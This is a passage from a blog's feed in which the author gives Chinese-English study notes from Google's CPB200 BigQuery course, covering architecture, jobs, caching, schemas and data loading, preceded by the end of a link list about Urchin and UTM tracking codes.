&lt;p&gt;Urchin was a web statistics analysis program developed by Urchin Software Corporation. It was used to analyze web server log file content and display the traffic information on that website based upon the log data.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://support.google.com/urchin/answer/28307/"&gt;Urchin Tracking Module (UTM) - Urchin Help&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The patent-pending Urchin Traffic Monitor (UTM) available in Urchin 4 was specifically designed to provide the most accurate measurements of unique website visitors.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.launchdigitalmarketing.com/what-are-utm-codes/"&gt;What Are UTM Codes and How Do You Use Them?&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;UTM Codes are a great way to see the results of your offline marketing.  In today’s day and age, we are hit with so many types of marketing and advertising that we may not even notice all of them.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="cli"></category><category term="git"></category><category term="github"></category><category term="interview"></category><category term="linux"></category><category term="machine_learning"></category><category term="python"></category><category term="ruby"></category><category term="security"></category><category term="technews"></category><category term="web"></category></entry><entry><title>CPB200: BigQuery for Data Analysts</title><link href="https://blog.m157q.tw/posts/2016/12/15/cpb200-bigquery-for-data-analysts/" rel="alternate"></link><published>2016-12-16T17:07:43+08:00</published><updated>2016-12-16T17:07:43+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-15:posts/2016/12/15/cpb200-bigquery-for-data-analysts/</id><summary type="html">&lt;h1&gt;課程資訊&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://myclass.gcptrain.org/"&gt;http://myclass.gcptrain.org/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;azkyY21yCg==  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/cpb200-bigquery-for-data-analysts"&gt;https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/cpb200-bigquery-for-data-analysts&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/files/cpb200-bigquery-for-data-analysts/CPB200.zip"&gt;slides&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google 系列課程  &lt;ul&gt;
&lt;li&gt;CP100: 介紹性質，廣而淺，新手課程。  &lt;/li&gt;
&lt;li&gt;CP200: 開始針對單一技術做比較深的介紹。  &lt;/li&gt;
&lt;li&gt;CP300: 五個全天的課程，上完之後一個月內通過線上考試可以拿到 CP300 證照。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/experts/"&gt;GDE: Cloud Developer Expert&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 1: 2016/12/15&lt;/h1&gt;
&lt;hr /&gt;
&lt;h1&gt;Course Introduction&lt;/h1&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 1: Introducing BigQuery&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;SMACK  &lt;ul&gt;
&lt;li&gt;Spark  &lt;/li&gt;
&lt;li&gt;Mesos  &lt;/li&gt;
&lt;li&gt;Akka  &lt;/li&gt;
&lt;li&gt;Cassandra  &lt;/li&gt;
&lt;li&gt;Kafka  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Big Data Current State&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Real-Time Streaming Data  &lt;/li&gt;
&lt;li&gt;Web analysis data  &lt;/li&gt;
&lt;li&gt;IoT sensor data  &lt;/li&gt;
&lt;li&gt;Fraud detection  &lt;/li&gt;
&lt;li&gt;一台 8-core, 32GB RAM 的 server 在普通情況下，大概撐不到 1000 個 concurrent connection  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;On Premises Versus Cloud&lt;/h2&gt;
&lt;p&gt;Premises =&amp;gt; Warehouse  &lt;/p&gt;
&lt;p&gt;公司有機房的聽眾：「申請一台機器最快要一個禮拜才能用，一台機器要撐 3~5 年。」  &lt;/p&gt;
&lt;h2&gt;Google's History of Innovation in Big Data&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Google Big Data Stack 1.0  &lt;ul&gt;
&lt;li&gt;2002: GFS  &lt;/li&gt;
&lt;li&gt;2004: MapReduce  &lt;/li&gt;
&lt;li&gt;2005: Bigtable  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google Big Data Stack 2.0  &lt;ul&gt;
&lt;li&gt;2006: Dremel  &lt;ul&gt;
&lt;li&gt;Apache Drill  &lt;/li&gt;
&lt;li&gt;Query Engine  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2010: Colossus  &lt;/li&gt;
&lt;li&gt;2011: Megastore  &lt;/li&gt;
&lt;li&gt;2012: Millwheel  &lt;ul&gt;
&lt;li&gt;處理 Streaming 的資料  &lt;/li&gt;
&lt;li&gt;和 Apache Beam 有關  &lt;/li&gt;
&lt;li&gt;Google Cloud Dataflow is based on Millwheel  &lt;/li&gt;
&lt;li&gt;Dataflow 會幫你預測資料大小，然後去做調整。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;What is BigQuery&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Fully-managed, analytics data warehouse.  &lt;ul&gt;
&lt;li&gt;Near real-time interactive analysis  &lt;ul&gt;
&lt;li&gt;batch / streaming  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NoOps - No administration for performance and scale  &lt;ul&gt;
&lt;li&gt;但 OPs 還是得注意每天和每個月的 BigQuery 用量  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Reliable  &lt;/li&gt;
&lt;li&gt;Economical  &lt;/li&gt;
&lt;li&gt;Secure  &lt;ul&gt;
&lt;li&gt;可以透過 ACL 分享 dataset  &lt;/li&gt;
&lt;li&gt;Data is encrypted in transport and at rest  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Auditable  &lt;ul&gt;
&lt;li&gt;Immutable logs  &lt;ul&gt;
&lt;li&gt;除非是共用帳號，不然都找得到誰做了什麼事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scalable  &lt;ul&gt;
&lt;li&gt;Virtually unlimited data storeage and processing power.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Flexible  &lt;ul&gt;
&lt;li&gt;Streaming ingestion: 100K rows/sec per table for real-time data  &lt;/li&gt;
&lt;li&gt;Data mashup: JOIN across diverse datasets/projects  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Easy to use  &lt;ul&gt;
&lt;li&gt;Requires no indexes, keys, or partitions  &lt;/li&gt;
&lt;li&gt;Familiar SQL interface and intuitive UI  &lt;/li&gt;
&lt;li&gt;Nested and repeated field support for schema flexibility  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery Is Not&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Transactional RDBMS  &lt;ul&gt;
&lt;li&gt;BigQuery is not an OLTP system  &lt;/li&gt;
&lt;li&gt;BigQuery 不像 RDBMS 要做正規化，反而是要做反正規化，讓資料愈扁平愈好  &lt;/li&gt;
&lt;li&gt;RDBMS 要求 query 要在數毫秒，但 BigQuery 的 query  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Operational Data Store  &lt;ul&gt;
&lt;li&gt;BigQuery is not geared towards capturing live data and applying updates/deletes as they happen in the system of record  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;On-premises solution or appliance  &lt;ul&gt;
&lt;li&gt;BigQuery is a self-contained, cloud-based solution  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Comparisons&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;OLTP (Online Transaciton Processing)  &lt;/li&gt;
&lt;li&gt;OLAP (Online Analytical Processing)  &lt;ul&gt;
&lt;li&gt;Similar in use cases they support  &lt;/li&gt;
&lt;li&gt;BigQuery allows querying via SQL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MapReduce  &lt;ul&gt;
&lt;li&gt;Fundamentally a batch oriented technology  &lt;/li&gt;
&lt;li&gt;Higher latency than BigQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NoSQL  &lt;ul&gt;
&lt;li&gt;Less scalable than BigQuery  &lt;/li&gt;
&lt;li&gt;Awkward or impossible to query - No query language  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery Use Cases&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Games and social media analytics  &lt;/li&gt;
&lt;li&gt;Advertising campaign optimization  &lt;/li&gt;
&lt;li&gt;Sensor data analysis  &lt;/li&gt;
&lt;li&gt;POS-Retail Analytics  &lt;/li&gt;
&lt;li&gt;Web logs, machine logs, infrastructure monitoring  &lt;ul&gt;
&lt;li&gt;Google 利用 Machine Learning 分析 Machine logs 來去針對 server 做最佳的管理  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/solutions/mobile/mobile-gaming-analysis-telemetry"&gt;Mobile Gaming Analytics&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/customers/zulily/"&gt;Zulily  |  Google Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 1&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cpb200-free-trial/#0"&gt;Sign Up for the Free Trial and Create a Project&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 2: BigQuery Functional Overview&lt;/h1&gt;
&lt;h2&gt;BigQuery Project Structure&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Project  &lt;ul&gt;
&lt;li&gt;Top-level structure  &lt;/li&gt;
&lt;li&gt;Contains users, APIs authentications, billing, data, access control lists (control access to datasets and jobs)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dataset  &lt;ul&gt;
&lt;li&gt;Named parent of 1 or more tables  &lt;/li&gt;
&lt;li&gt;一堆 Table 的集合  &lt;/li&gt;
&lt;li&gt;Support Partition Tables  &lt;/li&gt;
&lt;li&gt;如果資料存入以後沒有異動，3個月以後，費用會減半。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Table  &lt;ul&gt;
&lt;li&gt;Columnar structure that stores data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Job  &lt;ul&gt;
&lt;li&gt;Controls potentially long-running actions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Projects&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可以決定要把哪些 Table 分享給哪些人  &lt;/li&gt;
&lt;li&gt;已經做完的 Job 不用 Clean 掉，因為沒有說執行過多少 Job 就不能執行  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Datasets&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Reader  &lt;/li&gt;
&lt;li&gt;Editor  &lt;/li&gt;
&lt;li&gt;Owner  &lt;ul&gt;
&lt;li&gt;可以分享  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Tables&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Collection of columns, rows  &lt;/li&gt;
&lt;li&gt;Have a schema  &lt;/li&gt;
&lt;li&gt;Views are supported  &lt;/li&gt;
&lt;li&gt;Can be external (federated)  &lt;ul&gt;
&lt;li&gt;Google Cloud Storage, Google Drive  &lt;/li&gt;
&lt;li&gt;可以從外部載入資料，例如只想存在自己的 Cloud Storage 的資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Jobs&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;每一次執行 query 都會產生一個 Job  &lt;/li&gt;
&lt;li&gt;Job 是 by user 紀錄的  &lt;/li&gt;
&lt;li&gt;以前不能 update, 現在可以 update 了  &lt;ul&gt;
&lt;li&gt;可以直接使用 Job ID 來 update insert 的內容  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery Storage&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Traditional RDBMS Storage  &lt;ul&gt;
&lt;li&gt;Row based  &lt;/li&gt;
&lt;li&gt;Record-oriented storage  &lt;/li&gt;
&lt;li&gt;透過 index 和正規化讓資料查詢可以更快速  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BigQuery Storage  &lt;ul&gt;
&lt;li&gt;Column based  &lt;/li&gt;
&lt;li&gt;Columnar storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;BigQuery Managed Storage&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery data is stored on persistent disks in distributed storage  &lt;/li&gt;
&lt;li&gt;No indexes, keys, or partitions are required  &lt;/li&gt;
&lt;li&gt;Scales to dozens of petabytes  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Storage Engine 2006-2015: ColumnIO&lt;/h3&gt;
&lt;p&gt;Date =&amp;gt; Decompress -&amp;gt; Filter (MapReduce) =&amp;gt; Emit  &lt;/p&gt;
&lt;h3&gt;Storage Engine 2016-Now: Capacitor&lt;/h3&gt;
&lt;p&gt;Data =&amp;gt; Emit =&amp;gt; Dictionary =&amp;gt; Filter =&amp;gt; Lookup  &lt;/p&gt;
&lt;p&gt;ref: &lt;a href="https://cloud.google.com/blog/big-data/2016/04/inside-capacitor-bigquerys-next-generation-columnar-storage-format"&gt;https://cloud.google.com/blog/big-data/2016/04/inside-capacitor-bigquerys-next-generation-columnar-storage-format&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;BigQuery Processing&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Borg - Cluster management system  &lt;/li&gt;
&lt;li&gt;Dremel query engine  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Query Processing 2006-2015&lt;/h3&gt;
&lt;p&gt;Mixer 0 &amp;lt;= Mixer 1 &amp;lt;= Leaf &amp;lt;= Juniper (Network) =&amp;gt; Distributed Storage (Colossus)  &lt;/p&gt;
&lt;h3&gt;Query Processing 2015-Present&lt;/h3&gt;
&lt;p&gt;Master &amp;lt;= Shard &amp;lt;= Shard &amp;lt;= Shard &amp;lt;= Juniper (Network) =&amp;gt; Distributed Storage (Colossus)  &lt;/p&gt;
&lt;h2&gt;BigQuery Web User Interface&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;要不要用 Cache  &lt;/li&gt;
&lt;li&gt;要不要用 Legacy SQL  &lt;/li&gt;
&lt;li&gt;查詢前記得按一下右邊的 Validator，檢查語法順便看一下總共會 Query 多少資料，以免費用爆表。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery CLI&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;可以從 Cloud Shell 或 Cloud SDK 使用 bq  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;bq help&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;bq ls&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;bq mk&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;bq load&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 2&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cpb200-bigquery-interfaces/#0"&gt;BigQuery Interfaces&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 3: BigQuery Fundamentals&lt;/h1&gt;
&lt;h2&gt;BigQuery Schemas&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Consist of 1 or more fields (flat or nested)  &lt;/li&gt;
&lt;li&gt;Define the field name, data type, and mode of columns in the table  &lt;/li&gt;
&lt;li&gt;Fields are strongly typed (explicitly defined)  &lt;/li&gt;
&lt;li&gt;Modes indicate whether field data is REQUIRED, NULLABLE or REPEATED  &lt;ul&gt;
&lt;li&gt;REQUIRED fields must contain non-null data  &lt;/li&gt;
&lt;li&gt;NULLABLE fields allow null values  &lt;/li&gt;
&lt;li&gt;REPEATED fields contain an array of values  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Schema Specification&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Specify schema on command line or in JSON file  &lt;/li&gt;
&lt;li&gt;Schema file must contain single array object with entries that provide these properties:  &lt;ul&gt;
&lt;li&gt;"name": Name of the column  &lt;/li&gt;
&lt;li&gt;"type": Type of data  &lt;/li&gt;
&lt;li&gt;"mode" (optional): REQUIRED, NULLABLE or REPEATED  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example JSON schema:  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[  
    {&amp;quot;name&amp;quot;: &amp;quot;name&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;required&amp;quot;},  
    {&amp;quot;name&amp;quot;: &amp;quot;gender&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;nullable&amp;quot;},  
    {&amp;quot;name&amp;quot;: &amp;quot;count&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;integer&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;required&amp;quot;}  
]  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Denormalized Data in BigQuery&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery uses a denormalized or "flat" schema  &lt;ul&gt;
&lt;li&gt;Flatten normalized tables for super-fast querying  &lt;/li&gt;
&lt;li&gt;No performance penalty for sparse columns or duplicate data  &lt;/li&gt;
&lt;li&gt;Pre-join datasets into homogeneous tables  &lt;/li&gt;
&lt;li&gt;Trade JOINS for column scans  &lt;ul&gt;
&lt;li&gt;Storage is more performant and cheaper than compute resources  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use nested repeated schema (using JSON or AVRO format) to simulate normalization benefits and limit duplication of data  &lt;ul&gt;
&lt;li&gt;Without nesting, aggregation or JOINs are required  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Denormalization Example&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A normalized one-to-many relationship between people and cities_lived is denormalized (“flattened”) into 1 table  &lt;ul&gt;
&lt;li&gt;A person may have one to many rows in the table  &lt;/li&gt;
&lt;li&gt;Name, age, and gender may be duplicated  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Using nested repeated schema avoids duplication of data  &lt;/li&gt;
&lt;li&gt;Still allows for a flattened table, which retains high performance  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery Jobs&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery defines and executes jobs for:  &lt;ul&gt;
&lt;li&gt;Query execution  &lt;/li&gt;
&lt;li&gt;Loading, copying, and exporting data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Jobs are atomic  &lt;/li&gt;
&lt;li&gt;Multiple jobs can run concurrently  &lt;/li&gt;
&lt;li&gt;Completed jobs are listed in the jobs collection  &lt;/li&gt;
&lt;li&gt;Jobs have 4 components:  &lt;ul&gt;
&lt;li&gt;Reference – Job ID  &lt;/li&gt;
&lt;li&gt;Configuration – Job task  &lt;/li&gt;
&lt;li&gt;Status – Job state  &lt;/li&gt;
&lt;li&gt;Statistics – Job statistics  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Job History 是 by user 的  &lt;ul&gt;
&lt;li&gt;要看到整個 project 的 BigQuery Job History 的話，要到 Cloud Logging 那邊選擇 BigQuery 查看  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Destination Tables and Caching&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Query results are stored in a destination table  &lt;/li&gt;
&lt;li&gt;Table is temporary or user-defined  &lt;/li&gt;
&lt;li&gt;Temporary tables are:  &lt;ul&gt;
&lt;li&gt;Defined by the service  &lt;/li&gt;
&lt;li&gt;Used as query cache – You are not billed for storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;User-defined tables:  &lt;ul&gt;
&lt;li&gt;Remain persistent  &lt;/li&gt;
&lt;li&gt;Are billed at normal storage rates  &lt;/li&gt;
&lt;li&gt;Target location can be any accessible project/dataset  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Query Caching&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Query results are cached to improve performance  &lt;ul&gt;
&lt;li&gt;Subject to same quota policies as non-cached queries  &lt;/li&gt;
&lt;li&gt;Cache results have a size limit of 128 MB compressed  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;No charge for queries that use cached results  &lt;/li&gt;
&lt;li&gt;Results are cached for approximately 24 hours  &lt;ul&gt;
&lt;li&gt;Lifetime extended when a query returns a cached result  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cache can be turned off  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在 Web UI 要怎麼知道是 Cached Query? =&amp;gt; 仔細看算 query 時間結果後面的小括號，會標示 cached。  &lt;/p&gt;
&lt;h4&gt;Caveats&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Query caching only works for predictable queries  &lt;ul&gt;
&lt;li&gt;When result set is identical to previous run(s) of a query  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cache is per-user  &lt;ul&gt;
&lt;li&gt;Not shareable across users  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cache is invalidated if:  &lt;ul&gt;
&lt;li&gt;Data in underlying table(s) changes  &lt;/li&gt;
&lt;li&gt;Query uses dynamic functions, such as &lt;code&gt;CURRENT_TIMESTAMP()&lt;/code&gt; or &lt;code&gt;NOW()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 3&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cpb200-bigquery-components/#0"&gt;BigQuery Components and Jobs&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 4: Ingesting, Transforming and Storing Data&lt;/h1&gt;
&lt;h2&gt;Ingesting Data&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Load data into BigQuery using CLI, web UI, or API  &lt;/li&gt;
&lt;li&gt;Load data directly into BigQuery storage using streaming insert or a load job  &lt;/li&gt;
&lt;li&gt;Load jobs support:  &lt;ul&gt;
&lt;li&gt;Google Cloud Storage  &lt;ul&gt;
&lt;li&gt;Standard, Durable Reduced Availability, or Nearline (reduced performance)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google Drive (JSON, CSV, AVRO, Sheets (first tab only))  &lt;/li&gt;
&lt;li&gt;CSV, JSON, &lt;a href="https://avro.apache.org/docs/current/"&gt;AVRO&lt;/a&gt; file uploads (slower)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Can also use partner-provided tools/services  &lt;/li&gt;
&lt;li&gt;Load jobs support four data sources:  &lt;ul&gt;
&lt;li&gt;Objects in Google Cloud Storage  &lt;/li&gt;
&lt;li&gt;Data sent with the job or streaming insert  &lt;/li&gt;
&lt;li&gt;A Google Cloud Datastore backup  &lt;/li&gt;
&lt;li&gt;Data in Google Drive  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data can be:  &lt;ul&gt;
&lt;li&gt;Loaded into a new table  &lt;/li&gt;
&lt;li&gt;Appended to a table  &lt;/li&gt;
&lt;li&gt;Used to overwrite a table  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BigQuery can ingest both compressed (GZIP) and uncompressed files  &lt;ul&gt;
&lt;li&gt;Highly parallel load operations allow uncompressed files to load significantly faster than compressed files  &lt;/li&gt;
&lt;li&gt;Uncompressed files are larger  &lt;ul&gt;
&lt;li&gt;Possible bandwidth limitations  &lt;/li&gt;
&lt;li&gt;More costly to store  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Weigh compression options based on use case  &lt;/li&gt;
&lt;li&gt;File size limits  &lt;ul&gt;
&lt;li&gt;CSV  &lt;ul&gt;
&lt;li&gt;Compressed: 4GB  &lt;/li&gt;
&lt;li&gt;Uncompressed  &lt;ul&gt;
&lt;li&gt;With newlines: 4GB  &lt;/li&gt;
&lt;li&gt;Without newlines: 5TB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;JSON (newline delimited)  &lt;ul&gt;
&lt;li&gt;Compressed: 4 GB  &lt;/li&gt;
&lt;li&gt;Uncompressed: 5 TB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AVRO  &lt;ul&gt;
&lt;li&gt;Compressed: Compressed files not supported; compressed data blocks are.  &lt;/li&gt;
&lt;li&gt;Uncompressed: 5 TB (2 MB for the file header)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Datastore == BigTable + &lt;a href="http://research.google.com/pubs/pub36971.html"&gt;MegaStore&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Appending and Reloading Data&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Use CLI or API to append data to an existing table  &lt;/li&gt;
&lt;li&gt;BigQuery does support deletes now (If unchecked the "use Legacy SQL")  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 4.1&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cpb200-loading-data/#0"&gt;Loading Data into BigQuery and Using Federated Queries&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;Processing/Transforming Data&lt;/h2&gt;
&lt;h3&gt;Schema Design Considerations&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Denormalized versus relational  &lt;ul&gt;
&lt;li&gt;Denormalized yields better performance with some duplication  &lt;/li&gt;
&lt;li&gt;JOINS on relational data are performant but can be slower than queries on denormalized data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Flat versus nested and repeated  &lt;/li&gt;
&lt;li&gt;Table partitioning  &lt;ul&gt;
&lt;li&gt;Single table for all data  &lt;/li&gt;
&lt;li&gt;Partition data by some range of values (date) - covered later  &lt;/li&gt;
&lt;li&gt;Table decorators (partition, snapshot) - covered later  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;@&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/bigquery/table-decorators"&gt;https://cloud.google.com/bigquery/table-decorators&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.gdeltproject.org/using-bigquery-table-decorators-to-lower-query-cost/"&gt;http://blog.gdeltproject.org/using-bigquery-table-decorators-to-lower-query-cost/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Data Format Considerations&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery supports three data formats: AVRO, JSON, CSV  &lt;/li&gt;
&lt;li&gt;AVRO:  &lt;ul&gt;
&lt;li&gt;Open source format that bundles serialized data and schema in same file  &lt;/li&gt;
